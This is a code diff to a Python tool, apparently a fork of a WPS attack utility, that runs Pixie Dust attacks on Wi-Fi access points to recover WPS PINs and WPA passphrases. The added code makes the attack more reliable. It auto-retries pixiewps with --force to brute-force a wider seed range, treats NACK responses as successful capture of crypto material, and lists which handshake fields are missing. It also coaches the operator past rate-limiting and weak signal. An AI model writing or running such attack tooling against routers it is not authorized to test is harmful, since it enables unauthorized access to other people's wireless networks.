@@ -993,8 +993,9 @@ class PixiewpsData:
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
-        self.last_m_message = 0
+        self.status = ''          # WSC_NACK, WPS_FAIL, GOT_PSK, scanning, …
+        self.last_m_message = 0   # Highest M-message number seen in this session
+        self.bssid = ''
         self.essid = ''
         self.wpa_psk = ''
 
@@ -1130,8 +1131,14 @@ class Companion:
                     print(f'{ok} The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
-                print(f'{info} Received WSC NACK')
-                print(f'{err} Error: wrong PIN code')
+                if pixiemode:
+                    # In Pixie Dust mode the PIN is intentionally a dummy value —
+                    # WSC NACK at M4 is EXPECTED and means we've successfully captured
+                    # the AP's E-Hash1/E-Hash2 crypto material.  This is NOT a failure.
+                    print(f'{info} Received WSC NACK (Pixie Dust: crypto data captured — this is normal)')
+                else:
+                    print(f'{info} Received WSC NACK')
+                    print(f'{err} Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 assert(len(self.pixie_creds.e_nonce) == 16*2)
@@ -1231,6 +1238,32 @@ class Companion:
                     if pin == '<empty>':
                         pin = "''"
                     return pin
+
+        # Detect "might be vulnerable" — AP needs --force (brute-force wider seed range).
+        # Auto-retry once with --force so the user doesn't have to know about this flag.
+        stdout_lower = r.stdout.lower()
+        might_vulnerable = ('might' in stdout_lower and 'vulnerable' in stdout_lower)
+        if might_vulnerable and not full_range:
+            print(f'{warn} AP /might be/ vulnerable — auto-retrying Pixiewps with --force …')
+            force_cmd = self.pixie_creds.get_pixie_cmd(full_range=True)
+            print(f'{info} {force_cmd}')
+            r2 = subprocess.run(force_cmd, shell=True, stdout=subprocess.PIPE,
+                                stderr=sys.stdout, encoding='utf-8', errors='replace')
+            print(r2.stdout)
+            if r2.returncode == 0:
+                for line in r2.stdout.splitlines():
+                    if ('[+]' in line) and ('WPS pin' in line):
+                        pin = line.split(':')[-1].strip()
+                        if pin == '<empty>':
+                            pin = "''"
+                        return pin
+            # Still no PIN — give the user the exact command to retry manually with fresh data
+            print(f'{warn} Pixiewps could not crack the PIN even with --force.')
+            print(f'{info} The AP\'s nonces may have changed. Re-run -K to collect fresh'
+                  f' handshake data, then try again.')
+            print(f'{info} Manual retry command (paste after fresh data collection):')
+            print(f'    {force_cmd}')
+
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
@@ -1383,9 +1416,35 @@ class Companion:
                 pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pixiedust_pin:
                     return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False, store_pin_on_fail=True)
+                # Pixiewps exhausted both standard and --force modes without finding a PIN.
+                # Suggest collecting a completely fresh set of handshake data because the AP's
+                # random nonces change on every new WPS session.
+                print(f'{warn} Pixie Dust failed — this AP may not be vulnerable, or the')
+                print(f'         nonce data has expired. Re-run with -K to try a fresh session.')
                 return False
             else:
-                print(f'{err} Not enough data to run Pixie Dust attack')
+                # Diagnose exactly which fields are missing so the user knows why Pixie Dust
+                # cannot proceed.  The most common causes are:
+                #   • Handshake stopped before M4 → E-Hash1/E-Hash2 never sent by AP
+                #   • wpa_supplicant debug output format mismatch → fields not parsed
+                missing = []
+                if not self.pixie_creds.pke:     missing.append('PKE (AP public key)')
+                if not self.pixie_creds.pkr:     missing.append('PKR (our public key)')
+                if not self.pixie_creds.e_nonce: missing.append('E-Nonce (AP nonce)')
+                if not self.pixie_creds.authkey: missing.append('AuthKey')
+                if not self.pixie_creds.e_hash1: missing.append('E-Hash1')
+                if not self.pixie_creds.e_hash2: missing.append('E-Hash2')
+                last_m = self.connection_status.last_m_message
+                print(f'{err} Pixie Dust data incomplete — missing: {", ".join(missing)}')
+                if last_m < 4:
+                    print(f'{warn} Handshake only reached M{last_m}. '
+                          f'E-Hash1/E-Hash2 are sent by the AP in M4 — '
+                          f'the exchange must progress to at least M4 for Pixie Dust to work.')
+                    print(f'{info} Possible causes: AP rate-limiting WPS, weak signal, or '
+                          f'AP already locked. Try moving closer or waiting before retrying.')
+                else:
+                    print(f'{info} Handshake reached M{last_m}. Run with -v to see raw '
+                          f'wpa_supplicant output and verify the missing fields were transmitted.')
                 return False
         else:
             if store_pin_on_fail:
